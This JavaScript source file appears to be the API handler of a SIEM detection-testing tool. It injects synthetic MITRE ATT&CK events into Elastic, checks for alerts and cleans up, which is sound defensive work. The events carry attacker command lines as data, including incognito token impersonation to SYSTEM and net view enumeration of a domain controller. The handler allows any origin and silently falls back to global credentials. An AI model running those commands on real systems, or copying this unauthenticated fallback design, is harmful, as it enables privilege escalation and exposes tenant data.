      'threat': { technique: { id: ['T1564', 'T1564.001'], name: ['Hide Artifacts', 'Hidden Files and Directories'] }, tactic: { name: ['Defense Evasion'] } },
      'message': '[DACTA-SIM] Hidden file — backdoor.exe set as hidden+system attributes'
    },

    // ── T1134: Token Manipulation ──
    'T1134': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'token-impersonation', outcome: 'success' },
      'process': { name: 'incognito.exe', pid: 9933, command_line: 'incognito.exe execute -c "NT AUTHORITY\\SYSTEM" cmd.exe' },
      'threat': { technique: { id: ['T1134', 'T1134.001'], name: ['Access Token Manipulation', 'Token Impersonation/Theft'] }, tactic: { name: ['Privilege Escalation'] } },
      'message': '[DACTA-SIM] Token impersonation — escalated to SYSTEM via incognito'
    },

    // ── T1135: Network Share Discovery ──
    'T1135': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'net.exe', pid: 9934, command_line: 'net view \\\\DC01 /all' },
      'threat': { technique: { id: ['T1135'], name: ['Network Share Discovery'] }, tactic: { name: ['Discovery'] } },
      'message': '[DACTA-SIM] Network share discovery — net view enumeration of domain controller shares'
    }
  };

  return PAYLOADS[technique] || {
    ...base,
    'event': { ...base.event, category: ['process'], type: ['info'], action: 'simulation-generic' },
    'threat': { technique: { id: [technique], name: [technique] }, tactic: { name: ['Unknown'] } },
    'message': `[DACTA-SIM] Generic simulation event for technique ${technique}`
  };
}

// ═════════════════════════════════════════════════════
// ACTIONS
// ═════════════════════════════════════════════════════

// ── INJECT: Write attack event into Elastic ──
// Supports credential fallback: if org-specific key gets auth error, retry with global key
async function injectEvent(elasticUrl, apiKey, index, doc, fallbackUrl, fallbackKey) {
  const url = `${elasticUrl}/${index}/_doc`;
  const resp = await fetch(url, getFetchOptions({
    method: 'POST',
    headers: {
      'Authorization': `ApiKey ${apiKey}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(doc)
  }));
  const data = await resp.json();

  // If auth failed and we have fallback credentials, retry with global key
  if (!resp.ok && data.error?.type === 'security_exception' && fallbackUrl && fallbackKey && fallbackKey !== apiKey) {
    console.log('[Simulate] Org SIEM key auth failed, falling back to global credentials');
    const fbResp = await fetch(`${fallbackUrl}/${index}/_doc`, getFetchOptions({
      method: 'POST',
      headers: {
        'Authorization': `ApiKey ${fallbackKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(doc)
    }));
    const fbData = await fbResp.json();
    return { success: fbResp.ok, id: fbData._id, index: fbData._index, error: fbData.error, usedFallback: true };
  }

  return { success: resp.ok, id: data._id, index: data._index, error: data.error };
}

// ── VERIFY: Check if alerts were generated for injected events ──
// Also verifies that the injected document exists in the simulation index
async function verifyDetection(elasticUrl, apiKey, simId, technique, fallbackUrl, fallbackKey) {
  const effectiveUrl = fallbackUrl || elasticUrl;
  const effectiveKey = fallbackKey || apiKey;

  // Step 1: Verify injected doc exists in simulation index
  let docExists = false;
  try {
    const docQuery = {
      size: 1,
      query: {
        bool: {
          must: [
            { match: { 'dacta.simulation_id': simId } },
            { match: { 'dacta.simulation_technique': technique } }
          ]
        }
      }
    };
    const docResp = await fetch(`${effectiveUrl}/logs-dacta.simulation-*/_search`, getFetchOptions({
      method: 'POST',
      headers: { 'Authorization': `ApiKey ${effectiveKey}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(docQuery)
    }));
    const docData = await docResp.json();
    const docHits = docData.hits?.total?.value ?? docData.hits?.total ?? 0;
    docExists = docHits > 0;
  } catch (e) {
    console.warn('[Simulate] Doc verification failed:', e.message);
  }

  // Step 2: Check Elastic Security alerts (.alerts-security.alerts-*)
  // Widen window to 10min to account for detection engine latency
  const alertQuery = {
    size: 5,
    query: {
      bool: {
        should: [
          { match_phrase: { 'kibana.alert.rule.threat.technique.id': technique } },
          { match_phrase: { 'threat.technique.id': technique } },
          { match_phrase: { 'signal.rule.threat.technique.id': technique } }
        ],
        minimum_should_match: 1,
        filter: [
          { range: { '@timestamp': { gte: 'now-10m' } } }
        ]
      }
    },
    sort: [{ '@timestamp': { order: 'desc' } }]
  };

  try {
    const resp = await fetch(`${effectiveUrl}/.alerts-security.alerts-*/_search`, getFetchOptions({
      method: 'POST',
      headers: { 'Authorization': `ApiKey ${effectiveKey}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(alertQuery)
    }));
    const data = await resp.json();
    const hits = data.hits?.total?.value ?? data.hits?.total ?? 0;
    return {
      detected: hits > 0,
      alert_count: hits,
      doc_exists: docExists,
      alerts: (data.hits?.hits || []).map(h => ({
        rule_name: h._source?.['kibana.alert.rule.name'] || h._source?.signal?.rule?.name || 'Unknown',
        severity: h._source?.['kibana.alert.severity'] || h._source?.signal?.rule?.severity || 'unknown',
        timestamp: h._source?.['@timestamp']
      }))
    };
  } catch (e) {
    return { detected: false, alert_count: 0, doc_exists: docExists, error: e.message };
  }
}

// ── CLEANUP: Delete injected simulation documents ──
async function cleanupSimulation(elasticUrl, apiKey, simId, fallbackUrl, fallbackKey) {
  const effectiveUrl = fallbackUrl || elasticUrl;
  const effectiveKey = fallbackKey || apiKey;

  // Use match instead of term to handle both keyword and text field mappings
  const deleteQuery = {
    query: {
      bool: {
        must: [
          { match: { 'dacta.simulation': true } },
          { match: { 'dacta.simulation_id': simId } }
        ]
      }
    }
  };

  try {
    const resp = await fetch(`${effectiveUrl}/logs-dacta.simulation-*/_delete_by_query`, getFetchOptions({
      method: 'POST',
      headers: { 'Authorization': `ApiKey ${effectiveKey}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(deleteQuery)
    }));
    const data = await resp.json();
    return { deleted: data.deleted || 0 };
  } catch (e) {
    return { deleted: 0, error: e.message };
  }
}

// ═════════════════════════════════════════════════════
// MAIN HANDLER
// ═════════════════════════════════════════════════════

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'POST only' });

  try {
    const { action, org_id, techniques, simulation_id, namespace, index_pattern } = req.body || {};

    if (!action) return res.status(400).json({ error: 'Missing action' });

    // Resolve org SIEM credentials
    const siem = await resolveOrgSIEM(org_id);
    const elasticUrl = siem?.url || DEFAULT_ELASTIC_URL;
    const apiKey = siem?.apiKey || DEFAULT_ELASTIC_API_KEY;
    const orgNamespace = namespace || siem?.metadata?.namespace || 'default';
    const orgIndexPattern = index_pattern || siem?.metadata?.index_pattern || 'logs-*';

    // Fallback credentials: always keep global as backup when org-specific key fails
    const hasFallback = DEFAULT_ELASTIC_URL && DEFAULT_ELASTIC_API_KEY && DEFAULT_ELASTIC_API_KEY !== apiKey;
    const fallbackUrl = hasFallback ? DEFAULT_ELASTIC_URL : null;
    const fallbackKey = hasFallback ? DEFAULT_ELASTIC_API_KEY : null;

    if (!elasticUrl || !apiKey) {
      if (!DEFAULT_ELASTIC_URL || !DEFAULT_ELASTIC_API_KEY) {
        return res.json({ error: 'No SIEM credentials available for this organization' });
      }
    }

    switch (action) {
      // ── INJECT: Send attack payloads into SIEM ──
      case 'inject': {
        if (!techniques || !Array.isArray(techniques)) {
          return res.status(400).json({ error: 'Required: techniques (array of MITRE IDs)' });
        }

        const simId = generateSimulationId();
        // Target index for injection: use a simulation-specific index to avoid polluting real data
        const targetIndex = `logs-dacta.simulation-${orgNamespace}`;
        const results = [];

        let usedFallback = false;
        for (const tech of techniques) {
          const event = buildAttackEvent(tech, simId, orgNamespace);
          const result = await injectEvent(
            usedFallback ? (fallbackUrl || elasticUrl) : elasticUrl,
            usedFallback ? (fallbackKey || apiKey) : apiKey,
            targetIndex, event, fallbackUrl, fallbackKey
          );
          if (result.usedFallback) usedFallback = true; // Stick with fallback for remaining
          results.push({
            technique: tech,
            injected: result.success,
            doc_id: result.id,
            index: result.index,
            error: result.error,
            usedFallback: result.usedFallback || false
          });
        }

        return res.json({
          action: 'inject',
          simulation_id: simId,
          target_index: targetIndex,
          org_id,
          techniques_injected: results.filter(r => r.injected).length,
          techniques_failed: results.filter(r => !r.injected).length,
          results
        });
      }

      // ── VERIFY: Check if detection rules fired ──
      case 'verify': {
        if (!simulation_id || !techniques) {
          return res.status(400).json({ error: 'Required: simulation_id, techniques' });
        }

        const verifyResults = [];
        for (const tech of techniques) {
          const v = await verifyDetection(elasticUrl, apiKey, simulation_id, tech, fallbackUrl, fallbackKey);
          verifyResults.push({ technique: tech, ...v });
        }

        return res.json({
          action: 'verify',
          simulation_id,
          results: verifyResults,
          detected_count: verifyResults.filter(r => r.detected).length,
          missed_count: verifyResults.filter(r => !r.detected).length
        });
      }

      // ── CLEANUP: Remove injected test data ──
      case 'cleanup': {
        if (!simulation_id) {
          return res.status(400).json({ error: 'Required: simulation_id' });
        }

        const cleanup = await cleanupSimulation(elasticUrl, apiKey, simulation_id, fallbackUrl, fallbackKey);
        return res.json({ action: 'cleanup', simulation_id, ...cleanup });
      }

      default:
        return res.status(400).json({ error: `Unknown action: ${action}` });
    }

  } catch (e) {
    console.error('[Simulate] Error:', e.message);
    return res.status(500).json({ error: e.message });
  }
}
